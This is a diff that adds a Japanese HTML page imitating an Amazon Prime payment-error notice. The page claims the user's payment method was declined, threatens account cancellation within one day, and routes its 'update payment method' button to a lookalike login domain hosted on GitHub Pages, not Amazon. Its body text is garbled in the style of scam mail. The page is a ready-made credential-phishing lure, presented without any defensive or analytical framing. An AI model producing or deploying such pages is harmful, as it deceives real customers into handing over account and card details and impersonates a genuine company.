@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>Amazon Prime 支払いエラー通知</title>
+  <style>
+    body {
+      font-family: "Helvetica Neue", sans-serif;
+      background-color: #f2f2f2;
+      padding: 40px;
+    }
+
+    .card {
+      position: relative; /* ← これがポイント！ */
+      background-color: #fff;
+      border-radius: 12px;
+      padding: 30px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+
+    .prime-logo {
+      width: 300px;
+      height: auto;
+      margin-bottom: 20px;
+    }
+
+    .warning-image {
+      position: absolute;
+      top: 12px;
+      left: 12px;
+      width: 120px;
+      height: auto;
+    }
+
+    .message {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 20px;
+      line-height: 1.6;
+      font-weight: bold;
+    }
+
+    .button {
+      display: inline-block;
+      background-color: #ff9900;
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 6px;
+      text-decoration: none;
+      font-weight: bold;
+      transition: background-color 0.3s ease;
+    }
+
+    .button:hover {
+      background-color: #e68a00;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <!-- 左上に配置される警告アイコン画像 -->
+    <a href="" target="_blank" rel="noopener noreferrer">
+      <img src="https://pbs.twimg.com/media/Gzh9stvbkAQwCSw?format=jpg&name=900x900" alt="警告アイコン" class="warning-image">
+    </a>
+
+    <!-- Amazon Prime ロゴ画像リンク -->
+    <a href="https://amazon.co.jp/prime" target="_blank" rel="noopener noreferrer"> 
+      <img src="https://pbs.twimg.com/media/Gzh6vxwbkAQz76K?format=jpg&name=900x900" alt="Amazon Prime ロゴ" class="prime-logo"> 
+    </a>
+
+    <div class="message">
+      お支払方法に問題があり、<br>
+      プライム特典をご利用いただけない状況です。
+    </div>
+
+    <a href="https://amazon-primevideo-login.github.io/amazon/" class="button" target="_blank" rel="noopener noreferrer">
+      支払方法を更新する
+    </a>
+    <p class="note">
+      Amazon利用いただきありがとうございます。
+      ご指定いただいたお客様のお支払い方法が承認されないため、。Amazonは無料ですが、ご登録の際には適用可能なお支払い方法を確認させていただきます。これは、ご登録時にご同意いただいたように。
+      1日以内に、アマゾンからの請求へのお支払いが確認できない限り、お客様のAmazon登録はキャンセルされ
+      他の有効な支払方法を更新・追加し、Amazonをご利用されたい場合は、以下の手順に従って更新してください。
+      1.お客様のお支払い方法にアクセス
+      2. Amazon登録したhttp://Amazon.co.jpのアカウントを使用してサインイン
+      登録済みのお支払手段の有効期限を更新、または新しく支払い手段を追加し、「続行」ボタンをクリック現在ご指定のお支払い方法が承認されない原因は、提携会社（クレジットカード会社等）の事情により異なりますが、利用可能限度額の超過、有効期限切れ、カード利用不可などが考えられます。大変お手数ですが詳細についてはサービスの提供元会社に直接お問い合わせください。
+      http://Amazon.co.jpをご利用いただき、ありがとうございます。
+      今後ともhttp://Amazon.co.jpをよろしくお願いいたします。
+      http://Amazon.co.jpカスタマーサービス
+    </p>
+  </div>
+</body>
+</html>
